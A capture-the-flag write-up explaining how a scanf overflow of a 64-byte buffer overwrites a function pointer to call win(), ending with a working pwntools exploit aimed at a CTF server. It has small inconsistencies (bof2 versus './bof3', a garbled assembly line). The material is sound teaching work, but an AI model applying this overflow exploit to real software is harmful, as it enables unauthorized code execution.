**This is a writeup for the bof2 challenge**

This is the main function that our program runs
```
int main(void) {
	void (*fp)(); 
	char bof[64];
	
	fp = &lose;
	
	scanf("%s", bof);
	fp();
	return 0;
}
```
In this function we can see:
    1. Creating a void pointer fp
    2. Initializing a char buffer of size 64 bytes
    3. Initialzing fp to the address of the lose function

Once again our scanf function call does not sanitize our input meaning we can write more characters into our buffer than we are allocated.

The attack method for this challenge is to overwrite the fp pointer so that it points at the win function instead of the lose function.

**Exploit method**

If we look at the assembly we see that 
```
SUB ESP, 0x50
```
Which is allocating 80 bytes of space for local variables

A few instructions down we see
```
LEA EDX, [EAX + 0xffffdfd5]=>lose
```
Which gets the address for the lose function

Now we will save that lose function pointer into fp
```
MOV dword ptr [EBP + fp],EDX=>lose
```

Then we push bof onto the stack by doing
```
EDX=>bof,[EBP + -0x4c]
PUSH EDX
```

Now if we look a few instructions down, we see that we are after our scanf we are calling the loading our pointer at fp and then calling the function
```
MOV EAX,dword ptr [EBP +fp]
CALL EAX=>lose
```

Alright so after we understand what our instructions are doing, we can look at our stack layout to understand what our payload will look like

```
Stack[0x0]:4 local_res0
Stack[-0x10]:1 local_10
Stack[-0x14]:4 fp
Stack[-0x54]:64 bof
```

The most important part of our stack is where bof and fp are located.
We must overflow the bof array so that we can overwrite the value of fp from the address of the lose function to the address of the win function.

When we calculate the offset from bof to fp we can do
```
0x54 - 0x14 = 0x40
0x40 => 64 bytes
```
The offset is 64 bytes which means we need to add this part to our payload so that we can store 64 bytes of data into our bof array when the scanf function is called
```
b"A" * 64
```

Now that we are in the fp address space, we can overwrite it with the address of the win function instead of the lose function. This will make it so that when fp is called, we will call the win function

Now we need to lookup the address for the win function so that we can write that into fp.
In ghidra, if we click on the win function we can see that the function is entered at the address "0x08049256"

Now the next part of our payload will look like this so that we can pack the address into little endian format and load it into fp
```
p32(0x08049256)
```

Our final payload looks like this
```
payload = b"A" * 64 + p32(0x08049256)
```

**FINAL EXPLOIT**

```
from pwn import *

HOST = "ctf.hackucf.org"
PORT = 9002
BINARY = './bof3'

elf = ELF(BINARY)
context.binary = elf

context.log_level = 'info'

TARGET_ADDRESS = 0x08049256  #elf.symbols['win'] also grabs the address
BUFFER_SIZE = 64

payload = b"A" * BUFFER_SIZE + p32(TARGET_ADDRESS)

def exploit_remote():
    r = remote(HOST, PORT)
    r.sendline(payload)
    r.interactive()
if __name__ == "__main__":
    exploit_remote()
```
